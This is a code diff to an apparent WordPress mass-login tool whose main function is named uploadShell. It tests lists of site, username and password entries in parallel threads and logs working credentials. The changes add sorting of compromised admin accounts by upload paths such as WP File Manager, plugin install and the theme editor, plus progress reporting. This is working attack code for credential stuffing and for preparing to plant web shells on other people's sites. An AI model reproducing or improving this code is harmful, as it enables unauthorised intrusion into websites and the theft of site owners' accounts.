@@ -1,4 +1,5 @@
 import sys
+import os
 import requests
 from multiprocessing.dummy import Pool as ThreadPool
 
@@ -7,7 +8,13 @@ W = '\033[0;37m'
 R = '\033[0;31m'
 C = '\033[1;36m'
 
-def uploadShell(site):
+progress_file = 'progress.txt'
+
+def report_progress(progress):
+    with open(progress_file, 'w') as f:
+        f.write(f"{progress}\n")
+
+def uploadShell(site, total_sites, index):
     asuna = site.replace('#', '|').replace('@', '|')
     try:
         site = asuna.split('|')[0]
@@ -19,22 +26,41 @@ def uploadShell(site):
         if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
             login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
             if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
-                print(' {}[{}+{}] {} --> {}Login Success!{}'.format(W, G, W, asuna, G, W))
                 with open('loginSuccess.txt', 'a') as saveLog:
                     saveLog.write(site + '#' + user + '@' + pasw + '\n')
+                if 'WP File Manager' in login.text:
+                    with open('wpfilemanager.txt', 'a') as assz:
+                        assz.write(site + '#' + user + '@' + pasw + '\n')
+                if 'plugin-install.php' in login.text:
+                    with open('plugin-install.txt', 'a') as assz:
+                        assz.write(site + '#' + user + '@' + pasw + '\n')
+                if 'theme-editor.php' in login.text:
+                    with open('wptheme.txt', 'a') as assz:
+                        assz.write(site + '#' + user + '@' + pasw + '\n')
+                if 'post-new.php' in login.text:
+                    with open('page.txt', 'a') as assz:
+                        assz.write(site + '#' + user + '@' + pasw + '\n')
             else:
-                print(' {}[{}-{}] {} --> {}Login Failed!{}'.format(W, R, W, asuna, R, W))
+                with open('failed.txt', 'a') as failLog:
+                    failLog.write(site + '#' + user + '@' + pasw + '\n')
         else:
-            print(' {}[{}-{}] {} --> {}Invalid Site!{}'.format(W, R, W, asuna, R, W))
+            with open('invalid.txt', 'a') as invalidLog:
+                invalidLog.write(site + '#' + user + '@' + pasw + '\n')
     except Exception as e:
-        print('\n {}[{}-{}] {} --> {}Failed!{} ({})\n'.format(W, R, W, site, R, W, e))
+        with open('failed.txt', 'a') as failLog:
+            failLog.write(f"{site}#{user}@{pasw} - Failed! ({e})\n")
+    finally:
+        progress = int((index / total_sites) * 100)
+        report_progress(progress)
 
 def main(filename, thread_count):
     try:
         with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
             sites = file.read().splitlines()
+        total_sites = len(sites)
         pool = ThreadPool(thread_count)
-        pool.map(uploadShell, sites)
+        for i, site in enumerate(sites):
+            pool.apply_async(uploadShell, args=(site, total_sites, i + 1))
         pool.close()
         pool.join()
     except FileNotFoundError:
